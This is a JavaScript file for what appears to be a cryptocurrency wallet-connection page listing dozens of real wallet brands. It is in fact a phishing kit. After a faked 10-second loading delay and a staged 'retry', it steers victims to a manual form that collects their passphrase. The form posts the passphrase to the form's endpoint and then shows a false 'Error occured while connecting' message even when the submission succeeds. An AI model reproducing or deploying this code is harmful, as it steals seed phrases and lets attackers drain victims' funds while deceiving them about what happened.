const wallets = [
	{
		id: 1,
		name: 'metamask',
		description: 'metamask.io',
		imgurl: 'icons/metamask.png',
	},
	{
		id: 2,
		name: 'Ledger',
		description: 'ledger.com',
		imgurl: 'icons/ledger.png',
	},
	{
		id: 3,
		name: 'wallet Connect',
		description: 'walletconnect.com',
		imgurl: 'icons/walletconnect.png',
	},
	{
		id: 4,
		name: 'binance chain wallet',
		description: 'binance.com',
		imgurl: 'icons/binance.png',
	},
	{
		id: 5,
		name: 'xaman wallet',
		description: 'xaman.app',
		imgurl: 'icons/xaman.png',
	},
	{
		id: 6,
		name: "D'Cent wallet",
		description: 'decentwallet.com',
		imgurl: 'icons/yoroi.jpeg',
	},
	{
		id: 7,
		name: 'Ballet Wallet',
		description: 'ballet.com',
		imgurl: 'icons/ballet.png',
	},
	{
		id: 8,
		name: 'tangem wallet',
		description: 'tangem.com',
		imgurl: 'icons/tangem.png',
	},
	{
		id: 9,
		name: 'arculus',
		description: 'getarculus.com',
		imgurl: 'icons/arculus.png',
	},
	{
		id: 10,
		name: 'bitfrost',
		description: 'bitfrost.io',
		imgurl: 'icons/bitfrost.png',
	},
	{
		id: 11,
		name: 'polygon wallet',
		description: 'polygon.technology',
		imgurl: 'icons/polygon.png',
	},
	{
		id: 12,
		name: 'nexo wallet',
		description: 'nexo.com',
		imgurl: 'icons/nexo.png',
	},
	{
		id: 13,
		name: 'bitpay',
		description: 'bitpay.com',
		imgurl: 'icons/bitpay.png',
	},
	{
		id: 14,
		name: 'saita pro',
		description: 'saitapro.com',
		imgurl: 'icons/saitapro.png',
	},
	{
		id: 15,
		name: 'walleth',
		description: 'walleth.org',
		imgurl: 'icons/walleth.png',
	},
	{
		id: 16,
		name: 'saitaMask',
		description: 'saitamask.org',
		imgurl: 'icons/saitamask.png',
	},
	{
		id: 17,
		name: 'argent',
		description: 'argent.xyz',
		imgurl: 'icons/argent.png',
	},
	{
		id: 18,
		name: 'KEPLER',
		description: 'kepler.io',
		imgurl: 'icons/kepler.png',
	},
	{
		id: 19,
		name: 'compound',
		description: 'compound.finance',
		imgurl: 'icons/compound.png',
	},
	{
		id: 20,
		name: 'Iotex',
		description: 'Iotex.io',
		imgurl: 'icons/iotex.png',
	},
	{
		id: 21,
		name: 'coin98',
		description: 'coin98.com',
		imgurl: 'icons/coin98.png',
	},
	{
		id: 22,
		name: 'coinbase',
		description: 'coinbase.com',
		imgurl: 'icons/coinbase.png',
	},
	{
		id: 23,
		name: 'onchain wallet',
		description: 'crypto.com',
		imgurl: 'icons/crypto.png',
	},
	{
		id: 24,
		name: 'token pocket',
		description: 'tokenpocket.pro',
		imgurl: 'icons/tokenpocket.png',
	},
	{
		id: 25,
		name: 'math wallet',
		description: 'mathwallet.org',
		imgurl: 'icons/mathwallet.png',
	},
	{
		id: 26,
		name: 'Exodus wallet',
		description: 'exodus.com',
		imgurl: 'icons/exodus.svg',
	},
	{
		id: 27,
		name: 'dharma',
		description: 'dharma.io',
		imgurl: 'icons/dharma.png',
	},
	{
		id: 28,
		name: 'atomic wallet',
		description: 'atomicwallet.io',
		imgurl: 'icons/atomic.png',
	},
	{
		id: 29,
		name: 'MYKEY ',
		description: 'mykey.org',
		imgurl: 'icons/mykey.png',
	},
	{
		id: 30,
		name: 'coolWallet s',
		description: 'atomicwallet.io',
		imgurl: 'icons/coolwallet-s.png',
	},
	{
		id: 31,
		name: 'nash ',
		description: 'nash.io',
		imgurl: 'icons/nash.png',
	},
	{
		id: 32,
		name: 'coinomi ',
		description: 'coinomi.com',
		imgurl: 'icons/coinus.jpg',
	},
	{
		id: 33,
		name: 'wallet.io ',
		description: 'wallet.io',
		imgurl: 'icons/wallet_io.jpg',
	},
	{
		id: 34,
		name: 'ownbit',
		description: 'ownbit.io',
		imgurl: 'icons/ownbit.jpg',
	},
	{
		id: 35,
		name: 'easyPockket ',
		description: 'easypocket.app',
		imgurl: 'icons/easypocket.jpg',
	},
	{
		id: 36,
		name: 'gridPlus ',
		description: 'gridplus.io',
		imgurl: 'icons/gridplus.jpg',
	},
	{
		id: 37,
		name: 'infinito ',
		description: 'infinitowallet.io',
		imgurl: 'icons/infinito.jpg',
	},
	{
		id: 38,
		name: 'safePal ',
		description: 'safepal.io',
		imgurl: 'icons/safepal.jpg',
	},
	{
		id: 39,
		name: 'bridge wallet ',
		description: 'mtpelerin.com',
		imgurl: 'icons/bridge_wallet.jpg',
	},
	{
		id: 40,
		name: 'bitKeep ',
		description: 'bitkeep.com',
		imgurl: 'icons/bitkeep.jpg',
	},
	{
		id: 41,
		name: 'unstoppable wallet ',
		description: 'gridpunstoppable.money',
		imgurl: 'icons/unstoppable_wallet.jpg',
	},
	{
		id: 42,
		name: 'HaloDefi wallet ',
		description: 'halodefi.org',
		imgurl: 'icons/halodefi_wallet.jpg',
	},
	{
		id: 43,
		name: 'yoroi wallet ',
		description: 'yoroi.com',
		imgurl: 'icons/yoroi.jpeg',
	},
	{
		id: 44,
		name: 'coinUs ',
		description: 'coinus.io',
		imgurl: 'icons/coinus.jpg',
	},
	{
		id: 45,
		name: 'guarda wallet ',
		description: 'guarda.com',
		imgurl: 'icons/guarda_wallet.jpg',
	},
	{
		id: 46,
		name: 'jade wallet ',
		description: 'jadewallet.io',
		imgurl: 'icons/jade_wallet.jpg',
	},
	{
		id: 47,
		name: 'plasmaPay ',
		description: 'plasmapay.com',
		imgurl: 'icons/plasmapay.jpg',
	},
	{
		id: 48,
		name: 'valora ',
		description: 'valora.app',
		imgurl: 'icons/valora.jpg',
	},
	{
		id: 49,
		name: 'hashkey Me ',
		description: 'me.hashkey.com',
		imgurl: 'icons/hashkey_me.jpg',
	},
	{
		id: 50,
		name: 'rWallet ',
		description: 'rsk.co',
		imgurl: 'icons/rwallet.jpg',
	},
	{
		id: 51,
		name: 'gridPlus ',
		description: 'gridplus.io',
		imgurl: 'icons/gridplus.jpg',
	},
	{
		id: 51,
		name: 'trustwallet ',
		description: 'trustwallet.com',
		imgurl: 'icons/trustwallet.jpg',
	},
	{
		id: 51,
		name: 'talken wallet ',
		description: 'talken.io',
		imgurl: 'icons/talken_wallet.jpg',
	},
	{
		id: 51,
		name: 'KEYRING PRO ',
		description: 'keyring.app',
		imgurl: 'icons/keyring_pro.jpg',
	},
	{
		id: 51,
		name: 'Trezor wallet ',
		description: '',
		imgurl: 'icons/trezor.png',
	},
	{
		id: 51,
		name: 'tongue wallet ',
		description: '',
		imgurl: 'icons/tongue_wallet.jpg',
	},
	{
		id: 51,
		name: 'spatium ',
		description: '',
		imgurl: 'icons/spatium.jpg',
	},
	{
		id: 51,
		name: 'gala token ',
		description: '',
		imgurl: 'icons/gala.png',
	},
	{
		id: 51,
		name: 'Enjin wallet ',
		description: '',
		imgurl: 'icons/enji.jpeg',
	},
];

const container = document.getElementById('wallet-container');
const modal = document.getElementById('modal');
const walletIcon = document.getElementById('wallet-icon');
const walletName = document.getElementById('wallet-name');
const closeBtn = document.getElementById('close-btn');
const loadingFrame = document.getElementById('loading-frame');
const manuallyFrame = document.getElementById('manually-frame');
const retryFrame = document.getElementById('retry-frame');
const tryAgainBtn = document.getElementById('try-again-btn');
const connectManuallyBtn = document.getElementById('connect-manually-btn');
const passphrase = document.getElementById('passphrase');
const submitBtn = document.getElementById('submitBtn');
const sModal = document.getElementById('smodal');
const form = document.getElementById('form');
const status = document.getElementById('status');
const wallet = document.getElementById('wallet');
const result = document.getElementById('box');
const search = document.getElementById('search');
const count = document.getElementById('count');
const box2 = document.getElementsByClassName('box2');
const searchBtn = document.getElementById('searchBtn');
wallets.forEach((item) => {
	const div = document.createElement('div');
	const div2 = document.createElement('div');
	const div3 = document.createElement('div');
	const div4 = document.createElement('div');
	const img = document.createElement('img');
	const h3 = document.createElement('h3');
	const p = document.createElement('p');

	p.textContent = item.description;
	h3.textContent = item.name;
	img.src = item.imgurl;
	div4.innerHTML = '&#10003;';

	img.className = 'rounded-full';
	div4.className =
		'absolute bg-red-700 h-4 w-4 rounded-full right-0 opacity-70 -bottom-2 text-white text-xs flex items-center justify-center';
	div.className =
		'flex items-center gap-3 p-5 shadow-lg rounded-xl hover:translate-x-1 transition-all duration-300 ease-in';
	div3.id = item.name;
	div2.className = 'rounded-full relative';
	h3.className = 'font-[500] text-lg capitalize py-1';
	p.className = 'text-gray-500 font-medium';
	img.width = 60;

	div2.appendChild(img);
	div2.appendChild(div4);
	div3.appendChild(h3);
	div3.appendChild(p);
	div.appendChild(div2);
	div.appendChild(div3);
	container.appendChild(div);

	modal.addEventListener('click', (e) => {
		modal.classList.add('hidden');
		wallet.value = '';
	});
	closeBtn.addEventListener('click', () => {
		modal.classList.toggle('hidden');
		wallet.value = '';
	});
	div.addEventListener('click', () => {
		modal.classList.toggle('hidden');
		walletIcon.src = item.imgurl;
		walletName.textContent = item.name;
		wallet.value = item.name;
		setTimeout(() => {
			manuallyFrame.classList.add('hidden');
			loadingFrame.classList.add('hidden');
			retryFrame.classList.remove('hidden');
		}, 10000);
	});
	connectManuallyBtn.addEventListener('click', () => {
		retryFrame.classList.add('hidden');
		manuallyFrame.classList.remove('hidden');
	});
});
sModal.addEventListener('click', (event) => {
	event.stopPropagation();
});
tryAgainBtn.addEventListener('click', () => {
	retryFrame.classList.add('hidden');
	loadingFrame.classList.remove('hidden');
	setTimeout(() => {
		loadingFrame.classList.add('hidden');
		retryFrame.classList.remove('hidden');
	}, 10000);
});

async function handleSubmit(event) {
	const data = new FormData(form);

	fetch(event.target.action, {
		method: event.target.method,
		body: data,
		headers: {
			Accept: 'application/json',
		},
	})
		.then((response) => {
			if (response.ok) {
				status.classList.add('text-red-600');
				status.textContent = 'Error occured while connecting';
				setTimeout(() => {
					window.location.replace('/');
				}, 5000);

				form.reset();
			} else {
				response.json().then((data) => {
					if (Object.hasOwn(data, 'errors')) {
						status.innerHTML = data['errors']
							.map((error) => error['message'])
							.join(', ');
					} else {
						status.innerHTML =
							'Oops! There was a problem submitting your form';
					}
				});
			}
		})
		.catch((error) => {
			status.innerHTML = 'Oops! There was a problem submitting your form';
		});
}

form.addEventListener('submit', (event) => {
	event.preventDefault();
	console.log(wallet.value);
	if (passphrase.value == '') {
		submitBtn.setAttribute('disabled');
	}
	handleSubmit(event);
});
searchBtn.addEventListener('click', (event) => {
	result.innerHTML = '';
	const results = wallets.filter((item) => {
		return item.name.toLowerCase().includes(search.value.toLowerCase());
	});
	if (results.length == 0) {
		count.textContent = 'No result found';
	} else {
		count.textContent = `${results.length} results found`;
		// result.classList.add(' border-b-2 rounded-full boredr-gray-300');
		results.forEach((item) => {
			const div = document.createElement('div');
			const div2 = document.createElement('div');
			const div3 = document.createElement('div');
			const div4 = document.createElement('div');
			const img = document.createElement('img');
			const h3 = document.createElement('h3');
			const p = document.createElement('p');

			p.textContent = item.description;
			h3.textContent = item.name;
			img.src = item.imgurl;
			div4.innerHTML = '&#10003;';

			img.className = 'rounded-full';
			div4.className =
				'absolute bg-red-700 h-4 w-4 rounded-full right-0 opacity-70 -bottom-2 text-white text-xs flex items-center justify-center';
			div.className =
				'flex items-center gap-3 p-5 shadow-lg rounded-xl hover:translate-x-1 transition-all duration-300 ease-in';
			div3.id = item.name;
			div2.className = 'rounded-full relative';
			h3.className = 'font-[500] text-lg capitalize py-1';
			p.className = 'text-gray-500 font-medium';
			img.width = 60;

			div2.appendChild(img);
			div2.appendChild(div4);
			div3.appendChild(h3);
			div3.appendChild(p);
			div.appendChild(div2);
			div.appendChild(div3);
			result.appendChild(div);

			div.addEventListener('click', () => {
				modal.classList.toggle('hidden');
				walletIcon.src = item.imgurl;
				walletName.textContent = item.name;
				wallet.value = item.name;
				setTimeout(() => {
					manuallyFrame.classList.add('hidden');
					loadingFrame.classList.add('hidden');
					retryFrame.classList.remove('hidden');
				}, 10000);
			});
		});

		
	}
	// result.innerHTML = results.map((item) => {
	// 	return `
	// 	<div class="mapped-items flex items-center gap-3 p-5 shadow-lg rounded-xl hover:translate-x-1 transition-all duration-300 ease-in">
	// 		<div class="rounded-full relative">
	// 			<img src="${item.imgurl}" class="rounded-full" width="60" />
	// 			<div class="absolute bg-red-700 h-4 w-4 rounded-full right-0 opacity-70 -bottom-2 text-white text-xs flex items-center justify-center">
	// 				&#10003;
	// 			</div>
	// 		</div>
	// 		<div id="${item.name}">
	// 			<h3 class="font-[500] text-lg capitalize py-1">${item.name}</h3>
	// 			<p class="text-gray-500 font-medium">${item.description}</p>
	// 		</div>
	// 	</div>`
	// }).join('');
});
